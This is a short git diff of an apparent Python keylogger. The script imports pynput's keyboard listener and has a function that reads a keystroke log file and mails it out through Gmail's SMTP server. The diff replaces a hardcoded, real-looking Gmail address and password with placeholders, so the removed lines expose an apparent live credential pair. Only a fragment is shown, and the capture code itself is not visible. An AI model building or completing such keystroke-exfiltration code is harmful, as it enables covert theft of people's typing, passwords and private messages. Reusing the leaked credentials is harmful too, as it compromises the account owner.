@@ -2,8 +2,8 @@ from time import sleep
 from pynput import keyboard
 import smtplib
 def sendTo_Email():
-    EMAIL = "shawnmichaelsudaria14@gmail.com"
-    PASS = "Networkdown14"
+    EMAIL = "************@gmail.com"
+    PASS = "Password"
     with open("log.txt", "r") as log:
         message = log.read()
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
